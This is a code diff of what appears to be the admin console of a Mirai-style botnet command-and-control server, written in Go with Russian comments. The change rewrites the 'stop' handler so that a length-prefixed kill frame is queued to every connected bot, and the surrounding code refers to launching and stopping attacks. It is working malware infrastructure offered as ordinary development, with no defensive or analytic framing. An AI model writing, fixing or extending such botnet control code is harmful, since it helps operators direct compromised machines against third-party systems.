@@ -1,14 +1,15 @@
 package main
 
 import (
-	"bytes"
-	"fmt"
-	"log"
-	"net"
-	"os"
-	"strconv"
-	"strings"
-	"time"
+    "bytes"
+    "encoding/binary"
+    "fmt"
+    "log"
+    "net"
+    "os"
+    "strconv"
+    "strings"
+    "time"
 )
 
 type Admin struct {
@@ -265,14 +266,17 @@ func (this *Admin) Handle() {
 			continue
 		}
 
-		if cmd == "stop" {
-			this.conn.Write([]byte("Stopping all attacks...\r\n"))
-			// отправляем kill команду всем ботам (правильный формат протокола)
-			killCmd := []byte{0x00, 0x01, 0x03} // length=1, command=0x03
-			clientList.QueueBuf(killCmd, -1, "")
-			this.conn.Write([]byte("All attacks stopped\r\n"))
-			continue
-		}
+        if cmd == "stop" {
+            this.conn.Write([]byte("Stopping all attacks...\r\n"))
+            // формируем кадр: [2 байта длины BE][payload]
+            payload := []byte{0x03}
+            frame := make([]byte, 2+len(payload))
+            binary.BigEndian.PutUint16(frame[0:2], uint16(len(payload)))
+            copy(frame[2:], payload)
+            clientList.QueueBuf(frame, -1, "")
+            this.conn.Write([]byte("All attacks stopped\r\n"))
+            continue
+        }
 
 		if cmd == "stats" {
 			this.conn.Write([]byte("\033[2J\033[1H"))
